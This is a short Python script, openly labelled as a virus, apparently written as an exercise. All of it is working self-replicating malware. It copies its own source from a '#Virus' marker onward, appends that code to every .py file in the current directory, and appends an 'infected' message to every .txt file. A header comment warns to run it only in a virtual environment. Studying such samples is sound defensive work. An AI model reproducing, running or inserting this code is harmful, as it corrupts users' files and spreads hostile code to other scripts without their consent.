#!/usr/bin/env python3 

#Do not execute this code unless it is a virtual env 

#Virus begin
import sys,glob,re
BluePrint=[]
def copy():
    fh=open(sys.argv[0],'r')
    lines=fh.readlines()
    fh.close()
    Infected=False
    for line in lines:
        if (re.search('#Virus',line)):
            Infected=True
        if (Infected):
                BluePrint.append(line)
def infect():
    txt_files=glob.glob('*.txt')
    for txt_file in txt_files:
        with open(txt_file,'a') as f:
            f.write('Congratulations,you have been infected ')
def spread():
    files=glob.glob('*.py')
    for txt in files:
        with open(txt,'a') as f:
            for line in BluePrint:
                f.write(line)
        print("infected {}".format(txt))
        

infect()
copy()
spread()
